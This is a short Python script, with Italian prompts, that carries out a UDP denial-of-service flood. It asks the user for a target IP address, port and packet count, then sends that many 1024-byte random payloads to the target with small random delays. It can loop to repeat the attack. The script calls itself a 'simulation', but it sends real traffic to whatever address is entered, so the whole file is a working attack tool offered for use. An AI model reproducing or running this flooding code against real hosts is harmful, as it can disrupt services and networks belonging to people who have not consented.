import socket, random, string, time


def udp_dos_attack():
    print("\nUDP Dos Attack Simulation")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    ip_target = input("\n-Inserire ip targer (es. 192.168.50.50): ")
    port_target = int(input("-Inserire porta target (es. 8080): "))
    target = ip_target, port_target
    print(f"\n [+] Target -> {ip_target}:{port_target}")


    pacchetti = int(input("Quanti pachetti vuoi inviare? "))
    for packet in range(pacchetti):
        mess = "".join(random.choices(string.digits, k=1024))
        invio = (s.sendto(mess.encode("utf-8"), target))

        # Aggiunto ritardo casuale
        ritardo = (time.sleep(random.uniform(0,0.1)))
        print(f"[-]{len(mess)}bytes")
        
    ricomincia = input("\n Attacco Completato! Vuoi farne altri? s/n: ")
    while True:
        try:
            if ricomincia == "S" or ricomincia == "s":
                return udp_dos_attack()
            elif ricomincia == "N" or ricomincia == "n":
                print("Ci vediamo al prossimo attacco!")
                break
            else:
                print("Digita la Lettera corretta|")
                return udp_dos_attack()
        except TypeError:
            print("C'è un errore!")


udp_dos_attack()